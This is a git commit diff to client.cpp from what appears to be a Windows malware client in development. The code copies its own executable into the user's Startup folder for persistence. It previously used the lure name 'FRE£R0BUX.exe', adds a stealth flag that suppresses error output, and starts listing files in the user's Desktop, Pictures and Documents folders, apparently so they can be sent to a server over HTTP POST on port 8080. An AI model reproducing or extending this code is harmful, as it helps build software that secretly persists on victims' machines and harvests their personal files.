ee9c69052c8422f850f94450d101f6d29f7f6bb4
schplorf <112661367+schplorf@users.noreply.github.com>
2022-12-06 23:06:34 +0000

    file path getting stuff

--- client.cpp
+++ client.cpp
@@ -8,8 +8,10 @@
 #include <shobjidl.h>
 #include <string>
 #include <iostream>
+#include <filesystem>
+namespace fs = std::filesystem;
 
-#define susBehaviour true
+#define susBehaviour false
 #define stealthBehaviour false
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
@@ -40,29 +42,53 @@ int main() {
 	// Get the path to the user's startup folder
 	char szStartupPath[MAX_PATH] = { 0 };
 	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+		#if !stealthBehaviour
 		DWORD errorCode = GetLastError();
 		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
+		#endif
 	}
 	// Get the path to the current executable
 	char szExecPath[MAX_PATH] = { 0 };
 	if (!SUCCEEDED(GetModuleFileName(NULL, szExecPath, MAX_PATH))) {
+		#if !stealthBehaviour
 		DWORD errorCode = GetLastError();
 		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
+		#endif
 	}
 	// Copy the executable to the startup folder
 	// - First, create a string with the new path of the new file
-	const char szStartupExecName[] = "FRE£R0BUX.exe";
+	const char szStartupExecName[] = "a.exe";
 	char szStartupExecPath[MAX_PATH];
 	sprintf(szStartupExecPath, "%s\\%s", szStartupPath, szStartupExecName);
-
 	if (!SUCCEEDED(CopyFile(szExecPath, szStartupExecPath, NULL))) {
+		#if !stealthBehaviour
 		DWORD errorCode = GetLastError();
 		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
+		#endif
 	}
+	#if !stealthBehaviour
 	printf("%s | %s\n", szStartupExecPath, szExecPath);
-	
+	#endif
 #endif // susBehaviour
-	getchar();
 
+	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
+	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
+	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
+	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
+	// Iterate through all files
+	for (const auto& entry : fs::directory_iterator(desktopPath)) {
+		std::cout << entry.path() << std::endl;
+	}
+	for (const auto& entry : fs::directory_iterator(desktopPath)) {
+		std::cout << entry.path() << std::endl;
+	}
+	for (const auto& entry : fs::directory_iterator(picturesPath)) {
+		std::cout << entry.path() << std::endl;
+	}
+	for (const auto& entry : fs::directory_iterator(documentsPath)) {
+		std::cout << entry.path() << std::endl;
+	}
+
+	getchar();
 	ExitProcess(EXIT_SUCCESS);
 }
